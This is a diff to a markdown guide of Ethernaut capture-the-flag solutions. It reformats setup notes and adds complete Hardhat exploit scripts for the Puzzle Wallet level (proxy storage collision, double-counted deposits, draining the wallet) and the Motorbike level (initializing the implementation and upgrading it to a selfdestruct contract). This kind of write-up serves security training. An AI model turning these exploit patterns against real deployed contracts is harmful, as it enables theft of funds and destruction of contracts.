@@ -507,7 +507,8 @@ main().catch((error) => {
 
 ## 15 Naught Coin
 
-Change the NaughtCoin.sol import to be `@openzeppelin/contracts/token/ERC20/ERC20.sol` and run `npm install @openzeppelin/contracts`
+- Change the NaughtCoin.sol import to be `@openzeppelin/contracts/token/ERC20/ERC20.sol`
+- Run `npm install @openzeppelin/contracts`
 
 ```js
 const hre = require("hardhat");
@@ -670,7 +671,9 @@ main().catch((error) => {
 
 ## 19 Alien Codex
 
-Change the Ownable.sol import to be `@openzeppelin/contracts/ownership/Ownable.sol` and run `npm install @openzeppelin/contracts@v2.5.0` and change the solidity version to `0.5.17` in `hardhat.config.js`
+- Change the AlienCodex.sol import to be `@openzeppelin/contracts/ownership/Ownable.sol`
+- Run `npm install @openzeppelin/contracts@v2.5.0`
+- Change the Solidity version to 0.5.17 in hardhat.config.js
 
 ```js
 const hre = require("hardhat");
@@ -810,11 +813,11 @@ main().catch((error) => {
 
 ## 22 Dex
 
-Change the Dex.sol imports to be
-- `@openzeppelin/contracts/token/ERC20/IERC20.sol`
-- `@openzeppelin/contracts/token/ERC20/ERC20.sol`
-- `@openzeppelin/contracts/access/Ownable.sol`
-And run `npm install @openzeppelin/contracts`
+- Change the Dex.sol imports to be
+  - `@openzeppelin/contracts/token/ERC20/IERC20.sol`
+  - `@openzeppelin/contracts/token/ERC20/ERC20.sol`
+  - `@openzeppelin/contracts/access/Ownable.sol`
+- Run `npm install @openzeppelin/contracts`
 
 ```js
 const hre = require("hardhat");
@@ -880,11 +883,11 @@ main().catch((error) => {
 
 ## 23 Dex Two
 
-Change the DexTwo.sol imports to be
-- `@openzeppelin/contracts/token/ERC20/IERC20.sol`
-- `@openzeppelin/contracts/token/ERC20/ERC20.sol`
-- `@openzeppelin/contracts/access/Ownable.sol`
-And run `npm install @openzeppelin/contracts`
+- Change the DexTwo.sol imports to be
+  - `@openzeppelin/contracts/token/ERC20/IERC20.sol`
+  - `@openzeppelin/contracts/token/ERC20/ERC20.sol`
+  - `@openzeppelin/contracts/access/Ownable.sol`
+- Run `npm install @openzeppelin/contracts`
 
 ```sol
 pragma solidity ^0.8.0;
@@ -951,6 +954,134 @@ async function main() {
     `${await targetContract.balanceOf(token1, targetAddress)} ${await targetContract.balanceOf(token2, targetAddress)}, ` +
     `${await targetContract.balanceOf(token1, signer.address)} ${await targetContract.balanceOf(token2, signer.address)}`
   );
+}
+
+main().catch((error) => {
+  console.error(error);
+  process.exitCode = 1;
+});
+```
+
+## 24 Puzzle Wallet
+
+- Get the UpgradeableProxy-08.sol file from the ethernaut checkout in `ethernaut/contracts/contracts/helpers/`
+  - Change its imports to be
+    - `@openzeppelin/contracts/proxy/Proxy.sol`
+    - `@openzeppelin/contracts/utils/Address.sol`
+- Run `npm install @openzeppelin/contracts`
+
+```js
+const hre = require("hardhat");
+
+async function main() {
+  const proxyAddress = "<target contract address>";
+  const proxyContract = (await hre.ethers.getContractFactory("PuzzleProxy")).attach(proxyAddress);
+  const walletContract = (await hre.ethers.getContractFactory("PuzzleWallet")).attach(proxyAddress);
+
+  console.log(`Slot 0: Proxy pendingAdmin / Wallet owner = ${await proxyContract.pendingAdmin()} ${await walletContract.owner()}`);
+  console.log(`Slot 1: Proxy admin / Wallet maxBalance = ${await proxyContract.admin()} ${await walletContract.maxBalance()}`);
+
+  console.log("Overwriting the Proxy pendingAdmin / Wallet owner");
+  const [ signer ] = await hre.ethers.getSigners();
+  (await proxyContract.proposeNewAdmin(signer.address)).wait();
+
+  console.log(`Slot 0: Proxy pendingAdmin / Wallet owner = ${await proxyContract.pendingAdmin()} ${await walletContract.owner()}`);
+
+  // Want to execute PuzzleWallet.setMaxBalance() (to overwrite the Wallet maxBalance / Proxy admin storage value).
+  // This first requires that the PuzzleWallet.balance is zero.
+  // Which requires executing PuzzleWallet.execute().
+  // Which requires manipulating the value of PuzzleWallet.balances[msg.sender]
+  // (Cannot use PuzzleWallet.deposit() directly as it would increase the PuzzleWallet.balance).
+
+  // Can use PuzzleWallet.multicall() to call PuzzleWallet.deposit() twice,
+  // that way the value of PuzzleWallet.balances[msg.sender] is increased twice.
+  // However cannot call directly deposit() from multicall() twice due to the depositCalled guard,
+  // so will call deposit(), then another multicall() that itself calls deposit().
+  
+  (await walletContract.addToWhitelist(signer.address)).wait();
+
+  console.log(
+    "Wallet balance, Wallet.balances(player) = " +
+    `${await hre.ethers.provider.getBalance(proxyAddress)}, ` +
+    `${await walletContract.balances(signer.address)}`
+  );
+
+  (await walletContract.multicall([
+    walletContract.interface.encodeFunctionData("deposit"),
+    walletContract.interface.encodeFunctionData("multicall", [[walletContract.interface.encodeFunctionData("deposit")]])
+  ], {value: await hre.ethers.provider.getBalance(proxyAddress)})).wait();
+
+  console.log(
+    "Wallet balance, Wallet.balances(player) = " +
+    `${await hre.ethers.provider.getBalance(proxyAddress)}, ` +
+    `${await walletContract.balances(signer.address)}`
+  );
+
+  (await walletContract.execute(signer.address, await hre.ethers.provider.getBalance(proxyAddress), "0x")).wait();
+  console.log(`Wallet balance = ${await hre.ethers.provider.getBalance(proxyAddress)}`);
+
+  (await walletContract.setMaxBalance(signer.address)).wait();
+
+  console.log(`Slot 1: Proxy admin / Wallet maxBalance = ${await proxyContract.admin()} ${await walletContract.maxBalance()}`);
+}
+
+main().catch((error) => {
+  console.error(error);
+  process.exitCode = 1;
+});
+```
+
+## 25 Motorbike
+
+- Change the Motorbike.sol imports to be
+  - `@openzeppelin/contracts/utils/Address.sol`
+  - `@openzeppelin/contracts/proxy/Initializable.sol`
+- Run `npm install @openzeppelin/contracts@v3.4.2`
+- Change the Solidity version to 0.6.12 in hardhat.config.js
+
+```sol
+pragma solidity <0.7.0;
+
+contract EngineAttack {
+  function destroy() external {
+    selfdestruct(address(0));
+  }
+}
+```
+
+```js
+const hre = require("hardhat");
+
+async function main() {
+  const bikeAddress = "<target contract address>";
+  console.log(`Motorbike: Slot 0: Initializable.{initialized,initializing}, Engine.upgrader = ${await hre.ethers.provider.getStorage(bikeAddress, 0)}`);
+
+  const engineAddress = await (async () => {
+    const slot = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbcn;
+    return "0x" + (await hre.ethers.provider.getStorage(bikeAddress, slot)).substring(26);
+  })();
+  console.log(`Engine: Slot 0: Initializable.{initialized,initializing}, Engine.upgrader = ${await hre.ethers.provider.getStorage(engineAddress, 0)}`);
+
+  // Engine.initialize() has been called using delegatecall modifying the storage slots of Motorbike.
+  // However it has not been run against the underlying Engine contract.
+
+  const engineContract = (await hre.ethers.getContractFactory("Engine")).attach(engineAddress);
+  (await engineContract.initialize()).wait();
+  console.log(`Engine: Slot 0: Initializable.{initialized,initializing}, Engine.upgrader = ${await hre.ethers.provider.getStorage(engineAddress, 0)}`);
+
+  const attackContract = await hre.ethers.deployContract("EngineAttack");
+  await attackContract.waitForDeployment();
+  console.log(`EngineAttack address: ${await attackContract.getAddress()}`);
+
+  console.log(`EngineAttack.horsePower = ${await engineContract.horsePower()}`);
+
+  (await engineContract.upgradeToAndCall(
+    await attackContract.getAddress(),
+    (new hre.ethers.Interface(["function destroy()"])).encodeFunctionData("destroy")
+  )).wait();
+
+  // Verify the Engine contract has selfdestructed (this should raise an exception)
+  console.log(`EngineAttack.horsePower = ${await engineContract.horsePower()}`);
 }
 
 main().catch((error) => {
